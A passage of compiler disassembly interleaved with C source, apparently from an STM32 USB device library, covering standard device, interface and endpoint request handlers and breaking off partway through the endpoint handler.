 800b714:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b716:	683b      	ldr	r3, [r7, #0]
 800b718:	881a      	ldrh	r2, [r3, #0]
 800b71a:	68fb      	ldr	r3, [r7, #12]
 800b71c:	781b      	ldrb	r3, [r3, #0]
 800b71e:	b29b      	uxth	r3, r3
 800b720:	4413      	add	r3, r2
 800b722:	b29a      	uxth	r2, r3
 800b724:	683b      	ldr	r3, [r7, #0]
 800b726:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b728:	68fb      	ldr	r3, [r7, #12]
 800b72a:	781b      	ldrb	r3, [r3, #0]
 800b72c:	461a      	mov	r2, r3
 800b72e:	687b      	ldr	r3, [r7, #4]
 800b730:	4413      	add	r3, r2
 800b732:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b734:	68fb      	ldr	r3, [r7, #12]
}
 800b736:	4618      	mov	r0, r3
 800b738:	3714      	adds	r7, #20
 800b73a:	46bd      	mov	sp, r7
 800b73c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b740:	4770      	bx	lr

0800b742 <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b742:	b480      	push	{r7}
 800b744:	b087      	sub	sp, #28
 800b746:	af00      	add	r7, sp, #0
 800b748:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b74a:	687b      	ldr	r3, [r7, #4]
 800b74c:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b74e:	697b      	ldr	r3, [r7, #20]
 800b750:	781b      	ldrb	r3, [r3, #0]
 800b752:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b754:	697b      	ldr	r3, [r7, #20]
 800b756:	3301      	adds	r3, #1
 800b758:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b75a:	697b      	ldr	r3, [r7, #20]
 800b75c:	781b      	ldrb	r3, [r3, #0]
 800b75e:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b760:	8a3b      	ldrh	r3, [r7, #16]
 800b762:	021b      	lsls	r3, r3, #8
 800b764:	b21a      	sxth	r2, r3
 800b766:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b76a:	4313      	orrs	r3, r2
 800b76c:	b21b      	sxth	r3, r3
 800b76e:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b770:	89fb      	ldrh	r3, [r7, #14]
}
 800b772:	4618      	mov	r0, r3
 800b774:	371c      	adds	r7, #28
 800b776:	46bd      	mov	sp, r7
 800b778:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b77c:	4770      	bx	lr
	...

0800b780 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b780:	b580      	push	{r7, lr}
 800b782:	b084      	sub	sp, #16
 800b784:	af00      	add	r7, sp, #0
 800b786:	6078      	str	r0, [r7, #4]
 800b788:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b78a:	2300      	movs	r3, #0
 800b78c:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b78e:	683b      	ldr	r3, [r7, #0]
 800b790:	781b      	ldrb	r3, [r3, #0]
 800b792:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b796:	2b40      	cmp	r3, #64	; 0x40
 800b798:	d005      	beq.n	800b7a6 <USBD_StdDevReq+0x26>
 800b79a:	2b40      	cmp	r3, #64	; 0x40
 800b79c:	d857      	bhi.n	800b84e <USBD_StdDevReq+0xce>
 800b79e:	2b00      	cmp	r3, #0
 800b7a0:	d00f      	beq.n	800b7c2 <USBD_StdDevReq+0x42>
 800b7a2:	2b20      	cmp	r3, #32
 800b7a4:	d153      	bne.n	800b84e <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b7a6:	687b      	ldr	r3, [r7, #4]
 800b7a8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b7ac:	687b      	ldr	r3, [r7, #4]
 800b7ae:	32ae      	adds	r2, #174	; 0xae
 800b7b0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7b4:	689b      	ldr	r3, [r3, #8]
 800b7b6:	6839      	ldr	r1, [r7, #0]
 800b7b8:	6878      	ldr	r0, [r7, #4]
 800b7ba:	4798      	blx	r3
 800b7bc:	4603      	mov	r3, r0
 800b7be:	73fb      	strb	r3, [r7, #15]
      break;
 800b7c0:	e04a      	b.n	800b858 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b7c2:	683b      	ldr	r3, [r7, #0]
 800b7c4:	785b      	ldrb	r3, [r3, #1]
 800b7c6:	2b09      	cmp	r3, #9
 800b7c8:	d83b      	bhi.n	800b842 <USBD_StdDevReq+0xc2>
 800b7ca:	a201      	add	r2, pc, #4	; (adr r2, 800b7d0 <USBD_StdDevReq+0x50>)
 800b7cc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b7d0:	0800b825 	.word	0x0800b825
 800b7d4:	0800b839 	.word	0x0800b839
 800b7d8:	0800b843 	.word	0x0800b843
 800b7dc:	0800b82f 	.word	0x0800b82f
 800b7e0:	0800b843 	.word	0x0800b843
 800b7e4:	0800b803 	.word	0x0800b803
 800b7e8:	0800b7f9 	.word	0x0800b7f9
 800b7ec:	0800b843 	.word	0x0800b843
 800b7f0:	0800b81b 	.word	0x0800b81b
 800b7f4:	0800b80d 	.word	0x0800b80d
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b7f8:	6839      	ldr	r1, [r7, #0]
 800b7fa:	6878      	ldr	r0, [r7, #4]
 800b7fc:	f000 fa3c 	bl	800bc78 <USBD_GetDescriptor>
          break;
 800b800:	e024      	b.n	800b84c <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b802:	6839      	ldr	r1, [r7, #0]
 800b804:	6878      	ldr	r0, [r7, #4]
 800b806:	f000 fbcb 	bl	800bfa0 <USBD_SetAddress>
          break;
 800b80a:	e01f      	b.n	800b84c <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b80c:	6839      	ldr	r1, [r7, #0]
 800b80e:	6878      	ldr	r0, [r7, #4]
 800b810:	f000 fc0a 	bl	800c028 <USBD_SetConfig>
 800b814:	4603      	mov	r3, r0
 800b816:	73fb      	strb	r3, [r7, #15]
          break;
 800b818:	e018      	b.n	800b84c <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b81a:	6839      	ldr	r1, [r7, #0]
 800b81c:	6878      	ldr	r0, [r7, #4]
 800b81e:	f000 fcad 	bl	800c17c <USBD_GetConfig>
          break;
 800b822:	e013      	b.n	800b84c <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b824:	6839      	ldr	r1, [r7, #0]
 800b826:	6878      	ldr	r0, [r7, #4]
 800b828:	f000 fcde 	bl	800c1e8 <USBD_GetStatus>
          break;
 800b82c:	e00e      	b.n	800b84c <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b82e:	6839      	ldr	r1, [r7, #0]
 800b830:	6878      	ldr	r0, [r7, #4]
 800b832:	f000 fd0d 	bl	800c250 <USBD_SetFeature>
          break;
 800b836:	e009      	b.n	800b84c <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b838:	6839      	ldr	r1, [r7, #0]
 800b83a:	6878      	ldr	r0, [r7, #4]
 800b83c:	f000 fd31 	bl	800c2a2 <USBD_ClrFeature>
          break;
 800b840:	e004      	b.n	800b84c <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b842:	6839      	ldr	r1, [r7, #0]
 800b844:	6878      	ldr	r0, [r7, #4]
 800b846:	f000 fd88 	bl	800c35a <USBD_CtlError>
          break;
 800b84a:	bf00      	nop
      }
      break;
 800b84c:	e004      	b.n	800b858 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b84e:	6839      	ldr	r1, [r7, #0]
 800b850:	6878      	ldr	r0, [r7, #4]
 800b852:	f000 fd82 	bl	800c35a <USBD_CtlError>
      break;
 800b856:	bf00      	nop
  }

  return ret;
 800b858:	7bfb      	ldrb	r3, [r7, #15]
}
 800b85a:	4618      	mov	r0, r3
 800b85c:	3710      	adds	r7, #16
 800b85e:	46bd      	mov	sp, r7
 800b860:	bd80      	pop	{r7, pc}
 800b862:	bf00      	nop

0800b864 <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b864:	b580      	push	{r7, lr}
 800b866:	b084      	sub	sp, #16
 800b868:	af00      	add	r7, sp, #0
 800b86a:	6078      	str	r0, [r7, #4]
 800b86c:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b86e:	2300      	movs	r3, #0
 800b870:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b872:	683b      	ldr	r3, [r7, #0]
 800b874:	781b      	ldrb	r3, [r3, #0]
 800b876:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b87a:	2b40      	cmp	r3, #64	; 0x40
 800b87c:	d005      	beq.n	800b88a <USBD_StdItfReq+0x26>
 800b87e:	2b40      	cmp	r3, #64	; 0x40
 800b880:	d852      	bhi.n	800b928 <USBD_StdItfReq+0xc4>
 800b882:	2b00      	cmp	r3, #0
 800b884:	d001      	beq.n	800b88a <USBD_StdItfReq+0x26>
 800b886:	2b20      	cmp	r3, #32
 800b888:	d14e      	bne.n	800b928 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b88a:	687b      	ldr	r3, [r7, #4]
 800b88c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b890:	b2db      	uxtb	r3, r3
 800b892:	3b01      	subs	r3, #1
 800b894:	2b02      	cmp	r3, #2
 800b896:	d840      	bhi.n	800b91a <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b898:	683b      	ldr	r3, [r7, #0]
 800b89a:	889b      	ldrh	r3, [r3, #4]
 800b89c:	b2db      	uxtb	r3, r3
 800b89e:	2b01      	cmp	r3, #1
 800b8a0:	d836      	bhi.n	800b910 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b8a2:	683b      	ldr	r3, [r7, #0]
 800b8a4:	889b      	ldrh	r3, [r3, #4]
 800b8a6:	b2db      	uxtb	r3, r3
 800b8a8:	4619      	mov	r1, r3
 800b8aa:	6878      	ldr	r0, [r7, #4]
 800b8ac:	f7ff fed8 	bl	800b660 <USBD_CoreFindIF>
 800b8b0:	4603      	mov	r3, r0
 800b8b2:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b8b4:	7bbb      	ldrb	r3, [r7, #14]
 800b8b6:	2bff      	cmp	r3, #255	; 0xff
 800b8b8:	d01d      	beq.n	800b8f6 <USBD_StdItfReq+0x92>
 800b8ba:	7bbb      	ldrb	r3, [r7, #14]
 800b8bc:	2b00      	cmp	r3, #0
 800b8be:	d11a      	bne.n	800b8f6 <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b8c0:	7bba      	ldrb	r2, [r7, #14]
 800b8c2:	687b      	ldr	r3, [r7, #4]
 800b8c4:	32ae      	adds	r2, #174	; 0xae
 800b8c6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8ca:	689b      	ldr	r3, [r3, #8]
 800b8cc:	2b00      	cmp	r3, #0
 800b8ce:	d00f      	beq.n	800b8f0 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b8d0:	7bba      	ldrb	r2, [r7, #14]
 800b8d2:	687b      	ldr	r3, [r7, #4]
 800b8d4:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b8d8:	7bba      	ldrb	r2, [r7, #14]
 800b8da:	687b      	ldr	r3, [r7, #4]
 800b8dc:	32ae      	adds	r2, #174	; 0xae
 800b8de:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8e2:	689b      	ldr	r3, [r3, #8]
 800b8e4:	6839      	ldr	r1, [r7, #0]
 800b8e6:	6878      	ldr	r0, [r7, #4]
 800b8e8:	4798      	blx	r3
 800b8ea:	4603      	mov	r3, r0
 800b8ec:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b8ee:	e004      	b.n	800b8fa <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b8f0:	2303      	movs	r3, #3
 800b8f2:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b8f4:	e001      	b.n	800b8fa <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b8f6:	2303      	movs	r3, #3
 800b8f8:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b8fa:	683b      	ldr	r3, [r7, #0]
 800b8fc:	88db      	ldrh	r3, [r3, #6]
 800b8fe:	2b00      	cmp	r3, #0
 800b900:	d110      	bne.n	800b924 <USBD_StdItfReq+0xc0>
 800b902:	7bfb      	ldrb	r3, [r7, #15]
 800b904:	2b00      	cmp	r3, #0
 800b906:	d10d      	bne.n	800b924 <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b908:	6878      	ldr	r0, [r7, #4]
 800b90a:	f000 fdf1 	bl	800c4f0 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b90e:	e009      	b.n	800b924 <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b910:	6839      	ldr	r1, [r7, #0]
 800b912:	6878      	ldr	r0, [r7, #4]
 800b914:	f000 fd21 	bl	800c35a <USBD_CtlError>
          break;
 800b918:	e004      	b.n	800b924 <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b91a:	6839      	ldr	r1, [r7, #0]
 800b91c:	6878      	ldr	r0, [r7, #4]
 800b91e:	f000 fd1c 	bl	800c35a <USBD_CtlError>
          break;
 800b922:	e000      	b.n	800b926 <USBD_StdItfReq+0xc2>
          break;
 800b924:	bf00      	nop
      }
      break;
 800b926:	e004      	b.n	800b932 <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b928:	6839      	ldr	r1, [r7, #0]
 800b92a:	6878      	ldr	r0, [r7, #4]
 800b92c:	f000 fd15 	bl	800c35a <USBD_CtlError>
      break;
 800b930:	bf00      	nop
  }

  return ret;
 800b932:	7bfb      	ldrb	r3, [r7, #15]
}
 800b934:	4618      	mov	r0, r3
 800b936:	3710      	adds	r7, #16
 800b938:	46bd      	mov	sp, r7
 800b93a:	bd80      	pop	{r7, pc}

0800b93c <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b93c:	b580      	push	{r7, lr}
 800b93e:	b084      	sub	sp, #16
 800b940:	af00      	add	r7, sp, #0
 800b942:	6078      	str	r0, [r7, #4]
 800b944:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b946:	2300      	movs	r3, #0
 800b948:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b94a:	683b      	ldr	r3, [r7, #0]
 800b94c:	889b      	ldrh	r3, [r3, #4]
 800b94e:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b950:	683b      	ldr	r3, [r7, #0]
 800b952:	781b      	ldrb	r3, [r3, #0]
 800b954:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b958:	2b40      	cmp	r3, #64	; 0x40
 800b95a:	d007      	beq.n	800b96c <USBD_StdEPReq+0x30>
 800b95c:	2b40      	cmp	r3, #64	; 0x40
 800b95e:	f200 817f 	bhi.w	800bc60 <USBD_StdEPReq+0x324>
 800b962:	2b00      	cmp	r3, #0
 800b964:	d02a      	beq.n	800b9bc <USBD_StdEPReq+0x80>
 800b966:	2b20      	cmp	r3, #32
 800b968:	f040 817a 	bne.w	800bc60 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b96c:	7bbb      	ldrb	r3, [r7, #14]
 800b96e:	4619      	mov	r1, r3
 800b970:	6878      	ldr	r0, [r7, #4]
 800b972:	f7ff fe82 	bl	800b67a <USBD_CoreFindEP>
 800b976:	4603      	mov	r3, r0
 800b978:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b97a:	7b7b      	ldrb	r3, [r7, #13]
 800b97c:	2bff      	cmp	r3, #255	; 0xff
 800b97e:	f000 8174 	beq.w	800bc6a <USBD_StdEPReq+0x32e>
 800b982:	7b7b      	ldrb	r3, [r7, #13]
 800b984:	2b00      	cmp	r3, #0
 800b986:	f040 8170 	bne.w	800bc6a <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b98a:	7b7a      	ldrb	r2, [r7, #13]
 800b98c:	687b      	ldr	r3, [r7, #4]
 800b98e:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b992:	7b7a      	ldrb	r2, [r7, #13]
 800b994:	687b      	ldr	r3, [r7, #4]
 800b996:	32ae      	adds	r2, #174	; 0xae
 800b998:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b99c:	689b      	ldr	r3, [r3, #8]
 800b99e:	2b00      	cmp	r3, #0
 800b9a0:	f000 8163 	beq.w	800bc6a <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b9a4:	7b7a      	ldrb	r2, [r7, #13]
 800b9a6:	687b      	ldr	r3, [r7, #4]
 800b9a8:	32ae      	adds	r2, #174	; 0xae
 800b9aa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b9ae:	689b      	ldr	r3, [r3, #8]
 800b9b0:	6839      	ldr	r1, [r7, #0]
 800b9b2:	6878      	ldr	r0, [r7, #4]
 800b9b4:	4798      	blx	r3
 800b9b6:	4603      	mov	r3, r0
 800b9b8:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b9ba:	e156      	b.n	800bc6a <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b9bc:	683b      	ldr	r3, [r7, #0]
 800b9be:	785b      	ldrb	r3, [r3, #1]
 800b9c0:	2b03      	cmp	r3, #3
 800b9c2:	d008      	beq.n	800b9d6 <USBD_StdEPReq+0x9a>
 800b9c4:	2b03      	cmp	r3, #3
 800b9c6:	f300 8145 	bgt.w	800bc54 <USBD_StdEPReq+0x318>
 800b9ca:	2b00      	cmp	r3, #0
 800b9cc:	f000 809b 	beq.w	800bb06 <USBD_StdEPReq+0x1ca>
 800b9d0:	2b01      	cmp	r3, #1
 800b9d2:	d03c      	beq.n	800ba4e <USBD_StdEPReq+0x112>
 800b9d4:	e13e      	b.n	800bc54 <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b9d6:	687b      	ldr	r3, [r7, #4]
 800b9d8:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b9dc:	b2db      	uxtb	r3, r3
 800b9de:	2b02      	cmp	r3, #2
 800b9e0:	d002      	beq.n	800b9e8 <USBD_StdEPReq+0xac>
 800b9e2:	2b03      	cmp	r3, #3
 800b9e4:	d016      	beq.n	800ba14 <USBD_StdEPReq+0xd8>
 800b9e6:	e02c      	b.n	800ba42 <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b9e8:	7bbb      	ldrb	r3, [r7, #14]
 800b9ea:	2b00      	cmp	r3, #0
 800b9ec:	d00d      	beq.n	800ba0a <USBD_StdEPReq+0xce>
 800b9ee:	7bbb      	ldrb	r3, [r7, #14]
 800b9f0:	2b80      	cmp	r3, #128	; 0x80
 800b9f2:	d00a      	beq.n	800ba0a <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b9f4:	7bbb      	ldrb	r3, [r7, #14]
 800b9f6:	4619      	mov	r1, r3
 800b9f8:	6878      	ldr	r0, [r7, #4]
 800b9fa:	f001 fa21 	bl	800ce40 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b9fe:	2180      	movs	r1, #128	; 0x80
 800ba00:	6878      	ldr	r0, [r7, #4]
 800ba02:	f001 fa1d 	bl	800ce40 <USBD_LL_StallEP>
 800ba06:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800ba08:	e020      	b.n	800ba4c <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800ba0a:	6839      	ldr	r1, [r7, #0]
 800ba0c:	6878      	ldr	r0, [r7, #4]
 800ba0e:	f000 fca4 	bl	800c35a <USBD_CtlError>
              break;
 800ba12:	e01b      	b.n	800ba4c <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800ba14:	683b      	ldr	r3, [r7, #0]
 800ba16:	885b      	ldrh	r3, [r3, #2]
 800ba18:	2b00      	cmp	r3, #0
 800ba1a:	d10e      	bne.n	800ba3a <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800ba1c:	7bbb      	ldrb	r3, [r7, #14]
 800ba1e:	2b00      	cmp	r3, #0
 800ba20:	d00b      	beq.n	800ba3a <USBD_StdEPReq+0xfe>
 800ba22:	7bbb      	ldrb	r3, [r7, #14]
 800ba24:	2b80      	cmp	r3, #128	; 0x80
 800ba26:	d008      	beq.n	800ba3a <USBD_StdEPReq+0xfe>
 800ba28:	683b      	ldr	r3, [r7, #0]
 800ba2a:	88db      	ldrh	r3, [r3, #6]
 800ba2c:	2b00      	cmp	r3, #0
 800ba2e:	d104      	bne.n	800ba3a <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800ba30:	7bbb      	ldrb	r3, [r7, #14]
 800ba32:	4619      	mov	r1, r3
 800ba34:	6878      	ldr	r0, [r7, #4]
 800ba36:	f001 fa03 	bl	800ce40 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800ba3a:	6878      	ldr	r0, [r7, #4]
 800ba3c:	f000 fd58 	bl	800c4f0 <USBD_CtlSendStatus>

              break;
 800ba40:	e004      	b.n	800ba4c <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800ba42:	6839      	ldr	r1, [r7, #0]
 800ba44:	6878      	ldr	r0, [r7, #4]
 800ba46:	f000 fc88 	bl	800c35a <USBD_CtlError>
              break;
 800ba4a:	bf00      	nop
          }
          break;
 800ba4c:	e107      	b.n	800bc5e <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800ba4e:	687b      	ldr	r3, [r7, #4]
 800ba50:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800ba54:	b2db      	uxtb	r3, r3
 800ba56:	2b02      	cmp	r3, #2
 800ba58:	d002      	beq.n	800ba60 <USBD_StdEPReq+0x124>
 800ba5a:	2b03      	cmp	r3, #3
 800ba5c:	d016      	beq.n	800ba8c <USBD_StdEPReq+0x150>
 800ba5e:	e04b      	b.n	800baf8 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800ba60:	7bbb      	ldrb	r3, [r7, #14]
 800ba62:	2b00      	cmp	r3, #0
 800ba64:	d00d      	beq.n	800ba82 <USBD_StdEPReq+0x146>
 800ba66:	7bbb      	ldrb	r3, [r7, #14]
 800ba68:	2b80      	cmp	r3, #128	; 0x80
 800ba6a:	d00a      	beq.n	800ba82 <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800ba6c:	7bbb      	ldrb	r3, [r7, #14]
 800ba6e:	4619      	mov	r1, r3
 800ba70:	6878      	ldr	r0, [r7, #4]
 800ba72:	f001 f9e5 	bl	800ce40 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800ba76:	2180      	movs	r1, #128	; 0x80
 800ba78:	6878      	ldr	r0, [r7, #4]
 800ba7a:	f001 f9e1 	bl	800ce40 <USBD_LL_StallEP>
 800ba7e:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800ba80:	e040      	b.n	800bb04 <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800ba82:	6839      	ldr	r1, [r7, #0]
 800ba84:	6878      	ldr	r0, [r7, #4]
 800ba86:	f000 fc68 	bl	800c35a <USBD_CtlError>
              break;
 800ba8a:	e03b      	b.n	800bb04 <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800ba8c:	683b      	ldr	r3, [r7, #0]
 800ba8e:	885b      	ldrh	r3, [r3, #2]
 800ba90:	2b00      	cmp	r3, #0
 800ba92:	d136      	bne.n	800bb02 <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800ba94:	7bbb      	ldrb	r3, [r7, #14]
 800ba96:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800ba9a:	2b00      	cmp	r3, #0
 800ba9c:	d004      	beq.n	800baa8 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800ba9e:	7bbb      	ldrb	r3, [r7, #14]
 800baa0:	4619      	mov	r1, r3
 800baa2:	6878      	ldr	r0, [r7, #4]
 800baa4:	f001 fa02 	bl	800ceac <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800baa8:	6878      	ldr	r0, [r7, #4]
 800baaa:	f000 fd21 	bl	800c4f0 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800baae:	7bbb      	ldrb	r3, [r7, #14]
 800bab0:	4619      	mov	r1, r3
 800bab2:	6878      	ldr	r0, [r7, #4]
 800bab4:	f7ff fde1 	bl	800b67a <USBD_CoreFindEP>
 800bab8:	4603      	mov	r3, r0
 800baba:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800babc:	7b7b      	ldrb	r3, [r7, #13]
 800babe:	2bff      	cmp	r3, #255	; 0xff
 800bac0:	d01f      	beq.n	800bb02 <USBD_StdEPReq+0x1c6>
 800bac2:	7b7b      	ldrb	r3, [r7, #13]
 800bac4:	2b00      	cmp	r3, #0
 800bac6:	d11c      	bne.n	800bb02 <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800bac8:	7b7a      	ldrb	r2, [r7, #13]
 800baca:	687b      	ldr	r3, [r7, #4]
 800bacc:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800bad0:	7b7a      	ldrb	r2, [r7, #13]
 800bad2:	687b      	ldr	r3, [r7, #4]
 800bad4:	32ae      	adds	r2, #174	; 0xae
 800bad6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800bada:	689b      	ldr	r3, [r3, #8]
